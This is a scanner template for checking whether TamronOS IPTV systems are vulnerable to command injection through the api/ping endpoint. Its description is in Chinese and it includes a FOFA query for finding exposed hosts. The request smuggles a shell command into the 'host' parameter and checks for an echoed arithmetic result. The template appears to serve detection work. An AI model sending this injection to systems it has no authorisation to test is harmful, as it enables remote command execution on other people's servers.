id: tamronos-iptv-rce

info:
  name: Tamronos iptv rce
  author: Print1n
  severity: high
  verified: true
  description: |
    TamronOS IPTV/VOD系统是一套基于Linux内核开发的宽带运营商、酒店、学校直播点播一体解决方案，系统提供了多种客户端（Android机顶盒、电视、PC版点播、手机版点播）方便用户通过不同的设备接入。TamronOS IPTV系统 api/ping 存在任意命令执行漏洞，攻击者通过漏洞可以执行任意命令。
    fofa: app="TamronOS-IPTV系统"
  reference:
    - https://mp.weixin.qq.com/s/-Nh_ptkpfQ7jxszQyzT9gQ
  tags: tamron,os,iptv,rce
  created: 2025/10/27

set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
rules:
  r0:
    request:
      method: GET
      path: /api/ping?count=5&host=;echo%20$(expr%20{{r1}}%20%2b%20{{r2}}):{{r1}}:{{r1}};&port=80&source=1.1.1.1&type=icmp
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
expression: r0()
